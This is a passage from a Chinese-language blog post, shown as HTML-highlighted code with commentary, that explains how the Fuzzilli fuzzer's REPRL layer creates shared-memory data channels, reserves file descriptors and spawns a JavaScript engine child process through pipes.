class="hljs-number">0</span><br>        script.withCString &#123; ptr <span class="hljs-keyword">in</span><br>            <span class="hljs-comment">// 调用libreprl中的reprl_execute()执行js脚本</span><br>            status <span class="hljs-operator">=</span> reprl_execute(reprlContext, ptr, <span class="hljs-type">UInt64</span>(script.utf8.count), <span class="hljs-type">UInt64</span>(timeout), <span class="hljs-operator">&amp;</span>execTime, freshInstance)<br>            <span class="hljs-comment">// 如果执行失败了，那么就尝试等待一会儿再执行</span><br>            <span class="hljs-keyword">if</span> status <span class="hljs-operator">&lt;</span> <span class="hljs-number">0</span> &#123;<br>                <span class="hljs-operator">...</span>log<span class="hljs-operator">...</span><br>                <span class="hljs-type">Thread</span>.sleep(forTimeInterval: <span class="hljs-number">1</span>)<br>                status <span class="hljs-operator">=</span> reprl_execute(reprlContext, ptr, <span class="hljs-type">UInt64</span>(script.utf8.count), <span class="hljs-type">UInt64</span>(timeout), <span class="hljs-operator">&amp;</span>execTime, <span class="hljs-number">1</span>)<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> status <span class="hljs-operator">&lt;</span> <span class="hljs-number">0</span> &#123;<br>            <span class="hljs-operator">...</span><br>        &#125;<br>        recentlyFailedExecutions <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br><span class="hljs-comment">// 从返回的状态码中提取信息</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-type">RIFEXITED</span>(status) <span class="hljs-operator">!=</span> <span class="hljs-number">0</span> &#123;<br>            <span class="hljs-keyword">let</span> code <span class="hljs-operator">=</span> <span class="hljs-type">REXITSTATUS</span>(status)<br>            <span class="hljs-keyword">if</span> code <span class="hljs-operator">==</span> <span class="hljs-number">0</span> &#123;<span class="hljs-comment">// 成功执行</span><br>                execution.outcome <span class="hljs-operator">=</span> .succeeded<br>            &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">// 执行失败</span><br>                execution.outcome <span class="hljs-operator">=</span> .failed(<span class="hljs-type">Int</span>(code))<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> <span class="hljs-type">RIFSIGNALED</span>(status) <span class="hljs-operator">!=</span> <span class="hljs-number">0</span> &#123;<span class="hljs-comment">// 由于signal而终止执行</span><br>            execution.outcome <span class="hljs-operator">=</span> .crashed(<span class="hljs-type">Int</span>(<span class="hljs-type">RTERMSIG</span>(status)))<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> <span class="hljs-type">RIFTIMEDOUT</span>(status) <span class="hljs-operator">!=</span> <span class="hljs-number">0</span> &#123;<br>            execution.outcome <span class="hljs-operator">=</span> .timedOut<span class="hljs-comment">// 超时</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">fatalError</span>(<span class="hljs-string">&quot;Unknown REPRL exit status <span class="hljs-subst">\(status)</span>&quot;</span>)<br>        &#125;<br>        execution.execTime <span class="hljs-operator">=</span> <span class="hljs-type">Double</span>(execTime) <span class="hljs-operator">/</span> <span class="hljs-number">1_000_000</span><span class="hljs-comment">// 写入运行时间</span><br><br>        <span class="hljs-keyword">return</span> execution <span class="hljs-comment">// 返回执行结果，覆盖率信息已经被写入到共享内存中了，由ProgramCoverageEvaluator负责处理</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么，REPRL类的部分就结束了，可以发现最终执行脚本是由<code>Sources/libreprl</code>负责的，下面进一步研究<code>libreprl-posix.c</code></p><h4 id="libreprl-posix-c"><a href="#libreprl-posix-c" class="headerlink" title="libreprl-posix.c"></a>libreprl-posix.c</h4><p>该文件最开始的部分都是些功能方法，跳过直接来到关键的<code>reprl_context</code>结构体。前面提到在runner初始化时，会初始化一个新的reprl_context对象，下面看看reprl_context：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reprl_context</span> &#123;</span><br>    <span class="hljs-comment">// reprl_initialize是否在此context中成功执行</span><br>    <span class="hljs-type">int</span> initialized;<br><br>    <span class="hljs-comment">// control pipe用于和js解释器进行交互</span><br>    <span class="hljs-type">int</span> ctrl_in;<span class="hljs-comment">// control pipe的read fd,只在子进程存活时有效</span><br>    <span class="hljs-type">int</span> ctrl_out;<span class="hljs-comment">// control pipe的write fd,只在子进程存活时有效</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data_channel</span>* <span class="hljs-title">data_in</span>;</span><span class="hljs-comment">// REPRL 到 Child的数据信道</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data_channel</span>* <span class="hljs-title">data_out</span>;</span><span class="hljs-comment">// Child 到 REPRL的数据信道</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data_channel</span>* <span class="hljs-title">child_stdout</span>;</span><span class="hljs-comment">// 用于收集子进程stdout的信道, 可选</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data_channel</span>* <span class="hljs-title">child_stderr</span>;</span><span class="hljs-comment">// 用于收集子进程stderr的信道, 可选</span><br><br>    <span class="hljs-comment">// 子进程的PID。如果当前没有子进程正在运行，则为零。</span><br>    <span class="hljs-type">pid_t</span> pid;<br><br>    <span class="hljs-comment">// 子进程的参数和环境变量</span><br>    <span class="hljs-type">char</span>** argv;<br>    <span class="hljs-type">char</span>** envp;<br><br>    <span class="hljs-comment">// A malloc&#x27;d string containing a description of the last error that occurred.</span><br>    <span class="hljs-comment">// 一个malloc分配的字符串缓冲区, 包含上一次出现的错误的描述</span><br>    <span class="hljs-type">char</span>* last_error;<br>&#125;;<br></code></pre></td></tr></table></figure><p>上述结构体的定义中，主要包含子进程的执行环境，子进程的pid，两个传递大量数据的信道，两个与子进程传递控制信息的fd。上面有个关键的结构体<code>data_channel</code>，用其定义了四个信道。下面详细看看这个结构体定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// A unidirectional communication channel for larger amounts of data, up to a maximum size (REPRL_MAX_DATA_SIZE).</span><br><span class="hljs-comment">// 用于更大数据量的单向通信通道，直至最大大小（REPRL_MAX_DATA_SIZE）。</span><br><span class="hljs-comment">// Implemented as a (RAM-backed) file for which the file descriptor is shared with the child process and which is mapped into our address space.</span><br><span class="hljs-comment">// 实现为一个（RAM支持的）文件，其文件描述符与子进程共享，并映射到我们的地址空间。</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data_channel</span> &#123;</span><br>    <span class="hljs-comment">// File descriptor of the underlying file. Directly shared with the child process.</span><br>    <span class="hljs-comment">// 底层文件的文件描述符。直接与子进程共享。</span><br>    <span class="hljs-comment">// 父进程中的文件描述符，会连接到子进程的fd上</span><br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-comment">// Memory mapping of the file, always of size REPRL_MAX_DATA_SIZE.</span><br>    <span class="hljs-comment">// 文件的内存映射，大小始终为REPRL_MAX_DATA_SIZE</span><br>    <span class="hljs-comment">// 上述文件映射到父进程地址空间的地址</span><br>    <span class="hljs-type">char</span>* mapping;<br>&#125;;<br><span class="hljs-comment">// data_channel是一个用于大量数据通讯的单向信道</span><br><span class="hljs-comment">// 通过内存映射文件实现, fd与子进程共享并映射到REPRL进程的地址空间中</span><br></code></pre></td></tr></table></figure><p>只看定义可能有点懵哈，那么我们看一下<code>runner.initialize()</code>关于REPRL上下文做的操作：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">override</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">initialize</span>() &#123;<br>    reprlContext <span class="hljs-operator">=</span> libreprl.reprl_create_context()<br>    <span class="hljs-keyword">if</span> reprlContext <span class="hljs-operator">==</span> <span class="hljs-literal">nil</span> &#123;<br>        logger.fatal(<span class="hljs-string">&quot;Failed to create REPRL context&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">let</span> argv <span class="hljs-operator">=</span> convertToCArray(processArguments)<br>    <span class="hljs-keyword">let</span> envp <span class="hljs-operator">=</span> convertToCArray(env)<br><br>    <span class="hljs-keyword">if</span> reprl_initialize_context(reprlContext, argv, envp, <span class="hljs-comment">/* capture stdout */</span> <span class="hljs-number">1</span>, <span class="hljs-comment">/* capture stderr: */</span> <span class="hljs-number">1</span>) <span class="hljs-operator">!=</span> <span class="hljs-number">0</span> &#123;<br>        logger.fatal(<span class="hljs-string">&quot;Failed to initialize REPRL context: <span class="hljs-subst">\(String(cString: reprl_get_last_error(reprlContext)))</span>&quot;</span>)<br>    &#125;<br><br>    freeCArray(argv, numElems: processArguments.count)<br>    freeCArray(envp, numElems: env.count)<br><br>    fuzzer.registerEventListener(for: fuzzer.events.<span class="hljs-type">Shutdown</span>) &#123; <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span><br>        reprl_destroy_context(<span class="hljs-keyword">self</span>.reprlContext)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>显然，首先有一个<code>reprl_create_context()</code>来创建reprl_context对象，随后由<code>reprl_initialize_context()</code>来初始化REPRL上下文对象。先看一下<code>reprl_create_context()</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> REPRL_CHILD_CTRL_IN 100<span class="hljs-comment">// 控制输入fd</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REPRL_CHILD_CTRL_OUT 101<span class="hljs-comment">// 控制输出fd</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REPRL_CHILD_DATA_IN 102<span class="hljs-comment">// 数据输入fd</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REPRL_CHILD_DATA_OUT 103<span class="hljs-comment">// 数据输出fd</span></span><br><br><span class="hljs-keyword">struct</span> reprl_context* <span class="hljs-title function_">reprl_create_context</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">// 预先占用下面四个fd, 因为在子进程中下面四个fd用于与父进程交互</span><br>    <span class="hljs-type">int</span> devnull = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_RDWR);<br>    dup2(devnull, REPRL_CHILD_CTRL_IN);<br>    dup2(devnull, REPRL_CHILD_CTRL_OUT);<br>    dup2(devnull, REPRL_CHILD_DATA_IN);<br>    dup2(devnull, REPRL_CHILD_DATA_OUT);<br>    close(devnull);<br><span class="hljs-comment">// 分配reprl_context对象</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> reprl_context));<br>&#125;<br></code></pre></td></tr></table></figure><p>通过<code>reprl_create_context()</code>占用文件描述符，确保子进程和父进程可以通过固定的文件描述符进行通信。REPRL使用4个预定义的FD进行父子进程通信。为避免其他代码（程序）以外占用这些FD，该函数提前用<code>dup2</code>将它们绑定到<code>/dev/null</code>（一个黑洞设备，写入的数据会被丢弃，读取时返回EOF）。这样后续在设置进程间通信（如管道或者socketpair）时，可以安全地覆盖这些FD，而不会与其他FD冲突。<code>dup2(old_fd, new_fd)</code>会让<code>new_fd</code>指向<code>old_fd</code>相同的文件&#x2F;设备。这里使用dup2时会将<code>REPRL_CHILD_CTRL_IN</code>等FD指向<code>/dev/null</code>。</p><p>随后，再看看初始化操作<code>reprl_initialize_context()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 初始化reprl_context，在这里就是传入的ctx结构体对象</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">reprl_initialize_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> reprl_context* ctx, <span class="hljs-type">const</span> <span class="hljs-type">char</span>** argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span>** envp, <span class="hljs-type">int</span> capture_stdout, <span class="hljs-type">int</span> capture_stderr)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (ctx-&gt;initialized) &#123;<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Context is already initialized&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 我们需要忽略SIGPIPE，因为我们可能会在子进程退出后写入管道。</span><br>    signal(SIGPIPE, SIG_IGN);<br><span class="hljs-comment">// 复制调用js shell的参数和环境变量</span><br>    ctx-&gt;argv = copy_string_array(argv);<br>    ctx-&gt;envp = copy_string_array(envp);<br><span class="hljs-comment">// 创建两个data_channel</span><br>    ctx-&gt;data_in = reprl_create_data_channel(ctx);<br>    ctx-&gt;data_out = reprl_create_data_channel(ctx);、<br>    <span class="hljs-comment">// 根据是否需要捕获子进程的stdout与stderr创建data_channel， 可选项</span><br>    <span class="hljs-keyword">if</span> (capture_stdout) &#123;<br>        ctx-&gt;child_stdout = reprl_create_data_channel(ctx);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (capture_stderr) &#123;<br>        ctx-&gt;child_stderr = reprl_create_data_channel(ctx);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!ctx-&gt;data_in || !ctx-&gt;data_out || (capture_stdout &amp;&amp; !ctx-&gt;child_stdout) || (capture_stderr &amp;&amp; !ctx-&gt;child_stderr)) &#123;<br>        <span class="hljs-comment">// Proper error message will have been set by reprl_create_data_channel</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><span class="hljs-comment">// 表示该上下文已经初始化（初始化成功）</span><br>    ctx-&gt;initialized = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后看到<code>reprl_create_data_channel()</code>函数，用来创建channel。那么进一步看看以理解data_channel结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> data_channel* <span class="hljs-title function_">reprl_create_data_channel</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> reprl_context* ctx)</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __linux__</span><br>    <span class="hljs-comment">// 创建一个匿名内存文件（不关联磁盘文件），适用于进程间共享数据</span><br>    <span class="hljs-comment">// MFD_CLOEXEC：表示FD在`exec`时自动关闭（防止子进程意外继承）</span><br>    <span class="hljs-type">int</span> fd = memfd_create(<span class="hljs-string">&quot;REPRL_DATA_CHANNEL&quot;</span>, MFD_CLOEXEC);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-type">char</span> path[] = <span class="hljs-string">&quot;/tmp/reprl_data_channel_XXXXXXXX&quot;</span>;<br>    <span class="hljs-type">int</span> fd = mkostemp(path, O_CLOEXEC);<br>    unlink(path);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">// 设置文件大小为REPRL_MAX_DATA_SIZE</span><br>    <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span> || ftruncate(fd, REPRL_MAX_DATA_SIZE) != <span class="hljs-number">0</span>) &#123;<br>        reprl_error(ctx, <span class="hljs-string">&quot;Failed to create data channel file: %s&quot;</span>, strerror(errno));<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-comment">// 把匿名内存文件映射到进程的地址空间中</span><br>    <span class="hljs-type">char</span>* mapping = mmap(<span class="hljs-number">0</span>, REPRL_MAX_DATA_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (mapping == MAP_FAILED) &#123;<br>        reprl_error(ctx, <span class="hljs-string">&quot;Failed to mmap data channel file: %s&quot;</span>, strerror(errno));<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><span class="hljs-comment">// 创建一个data_channel对象</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data_channel</span>* <span class="hljs-title">channel</span> =</span> <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> data_channel));<br>    channel-&gt;fd = fd;<span class="hljs-comment">// 在父进程中的fd</span><br>    channel-&gt;mapping = mapping;<span class="hljs-comment">//在父进程地址空间中的地址</span><br>    <span class="hljs-keyword">return</span> channel;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么此时便已经完成runner的初始化（也就是<code>reprl_context</code>的初始化）。<del>笔者到这还是不太理解这个mapping有何作用。</del> 这个mapping就是共享内存地址，后面的父子进程通信的四个管道fd会通过<code>dup2()</code>指向这块内存地址以进行传输数据，并且后续会通过<code>memcpy()</code>将javaScript直接copy到共享内存中。那么继续往后走吧，执行脚本最后调用的是<code>reprl_execute()</code>，这个太长了，并且是关键的执行函数，那么一步步拆解一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">reprl_execute</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> reprl_context* ctx, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* script, <span class="hljs-type">uint64_t</span> script_size, <span class="hljs-type">uint64_t</span> timeout, <span class="hljs-type">uint64_t</span>* execution_time, <span class="hljs-type">int</span> fresh_instance)</span><br>&#123;<br>    <span class="hljs-comment">// 执行前先检查此ctx是否已经完成初始化</span><br>    <span class="hljs-keyword">if</span> (!ctx-&gt;initialized) &#123;<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;REPRL context is not initialized&quot;</span>);<br>    &#125;<br><span class="hljs-comment">// 生成的脚本大小应小于共享内存的大小</span><br>    <span class="hljs-keyword">if</span> (script_size &gt; REPRL_MAX_DATA_SIZE) &#123;<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Script too large&quot;</span>);<br>    &#125;<br><span class="hljs-comment">// 超时时间的设置检查</span><br>    <span class="hljs-keyword">if</span> (timeout &gt; REPRL_MAX_TIMEOUT_IN_MICROSECONDS) &#123;<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Timeout too large&quot;</span>);<br>    &#125;<br>    <span class="hljs-type">int</span> timeout_ms = (<span class="hljs-type">int</span>)(timeout / <span class="hljs-number">1000</span>);<br><br>    <span class="hljs-comment">// Terminate any existing instance if requested.</span><br>    <span class="hljs-comment">// 判断是否需要终止子进程，在先前有一个判断，防止一个子进程执行次数过多</span><br>    <span class="hljs-keyword">if</span> (fresh_instance &amp;&amp; ctx-&gt;pid) &#123;<br>        reprl_terminate_child(ctx);<br>    &#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>执行前的一些检查，随后：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">reprl_execute</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> reprl_context* ctx, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* script, <span class="hljs-type">uint64_t</span> script_size, <span class="hljs-type">uint64_t</span> timeout, <span class="hljs-type">uint64_t</span>* execution_time, <span class="hljs-type">int</span> fresh_instance)</span><br>&#123;<br>    ...<br><span class="hljs-comment">// Reset file position so the child can simply read(2) and write(2) to these fds.</span><br>    <span class="hljs-comment">// 重置数据信道的fd，以方便子进程使用</span><br>    lseek(ctx-&gt;data_out-&gt;fd, <span class="hljs-number">0</span>, SEEK_SET);<br>    lseek(ctx-&gt;data_in-&gt;fd, <span class="hljs-number">0</span>, SEEK_SET);<br>    <span class="hljs-keyword">if</span> (ctx-&gt;child_stdout) &#123;<br>        lseek(ctx-&gt;child_stdout-&gt;fd, <span class="hljs-number">0</span>, SEEK_SET);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (ctx-&gt;child_stderr) &#123;<br>        lseek(ctx-&gt;child_stderr-&gt;fd, <span class="hljs-number">0</span>, SEEK_SET);<br>    &#125;<br><br>    <span class="hljs-comment">// Spawn a new instance if necessary.</span><br>    <span class="hljs-comment">// 如有必要，生成一个新实例。</span><br>    <span class="hljs-comment">// 实际就是，如果此时没有子进程的话，那么会创建一个。因为初始化时pid没有做任何修改，此时应该为空。</span><br>    <span class="hljs-keyword">if</span> (!ctx-&gt;pid) &#123;<br>        <span class="hljs-type">int</span> r = reprl_spawn_child(ctx);<br>        <span class="hljs-keyword">if</span> (r != <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> r;<br>    &#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><code>lseek(fd, offset, SEEK_SET)</code>：设置文件描述符<code>fd</code>的当前读写位置，<code>SEEK_SET</code>表示从文件开头计算偏移量，而这里offset为0，则回到起始位置。在Fuzzing中会反复执行目标程序并重置状态，每次执行前需要确保数据信道的读写位置归0，避免旧数据的干扰。</p></blockquote><p>随后会执行<code>reprl_spawn_child(ctx)</code>来创建子进程以执行，这个函数依然比较长，一步步拆解查看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">reprl_spawn_child</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> reprl_context* ctx)</span><br>&#123;<br>    <span class="hljs-comment">// This is also a good time to ensure the data channel backing files don&#x27;t grow too large.</span><br>    <span class="hljs-comment">// 这也是确保数据通道备份文件不会变得太大的好时机。</span><br>    ftruncate(ctx-&gt;data_in-&gt;fd, REPRL_MAX_DATA_SIZE);<span class="hljs-comment">// 调整data_in通道文件大小</span><br>    ftruncate(ctx-&gt;data_out-&gt;fd, REPRL_MAX_DATA_SIZE);<span class="hljs-comment">// 调整data_out通道文件大小</span><br>    <span class="hljs-keyword">if</span> (ctx-&gt;child_stdout) ftruncate(ctx-&gt;child_stdout-&gt;fd, REPRL_MAX_DATA_SIZE);<br>    <span class="hljs-keyword">if</span> (ctx-&gt;child_stderr) ftruncate(ctx-&gt;child_stderr-&gt;fd, REPRL_MAX_DATA_SIZE);<br><span class="hljs-comment">// 初始化pipefd数组为0</span><br>    <span class="hljs-type">int</span> crpipe[<span class="hljs-number">2</span>] = &#123; <span class="hljs-number">0</span>, <span class="hljs-number">0</span> &#125;;          <span class="hljs-comment">// 子进程 -&gt; REPRL（读端在父进程，写端在子进程）</span><br>    <span class="hljs-type">int</span> cwpipe[<span class="hljs-number">2</span>] = &#123; <span class="hljs-number">0</span>, <span class="hljs-number">0</span> &#125;;          <span class="hljs-comment">// REPRL -&gt; 子进程（写端在父进程，读端在子进程）</span><br><br>    <span class="hljs-keyword">if</span> (pipe(crpipe) != <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">// 创建父进程读，子进程写的管道</span><br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Could not create pipe for REPRL communication: %s&quot;</span>, strerror(errno));<br>    &#125;<br>    <span class="hljs-keyword">if</span> (pipe(cwpipe) != <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">// 创建父进程写，子进程读的管道</span><br>        close(crpipe[<span class="hljs-number">0</span>]);<br>        close(crpipe[<span class="hljs-number">1</span>]);<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Could not create pipe for REPRL communication: %s&quot;</span>, strerror(errno));<br>    &#125;<br><br>    ctx-&gt;ctrl_in = crpipe[<span class="hljs-number">0</span>];<span class="hljs-comment">// 当前是父进程，那么设置父进程读取子进程消息的fd</span><br>    ctx-&gt;ctrl_out = cwpipe[<span class="hljs-number">1</span>];<span class="hljs-comment">// 设置父进程向子进程写入消息的fd</span><br>    <span class="hljs-comment">// 设置文件描述符的 close-on-exec 标志，确保在 exec() 时自动关闭，避免子进程意外继承。</span><br>    fcntl(ctx-&gt;ctrl_in, F_SETFD, FD_CLOEXEC);<br>    fcntl(ctx-&gt;ctrl_out, F_SETFD, FD_CLOEXEC);<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><ul><li><p><code>ftruncate(fd, size)</code></p><ul><li>将文件描述符 <code>fd</code> 关联的文件大小设置为 <code>size</code>（字节）。</li><li>如果文件原来比 <code>size</code> 大，多余部分会被截断丢弃。</li><li>如果文件原来比 <code>size</code> 小，则扩展并用 <code>\0</code> 填充新增部分。</li></ul></li><li><p><code>pipe(int pipefd[2])</code></p><ul><li>创建一个 <strong>单向管道</strong>，<code>pipefd[0]</code> 是读端，<code>pipefd[1]</code> 是写端。即，<code>pipe</code>会创建一对新的fd，并写入<code>pipefd[0]</code>和<code>pipefd[1]</code>。</li><li><code>crpipe</code>（<code>child → reprl</code>）：<ul><li>子进程写入控制消息，父进程读取。</li></ul></li><li><code>cwpipe</code>（<code>reprl → 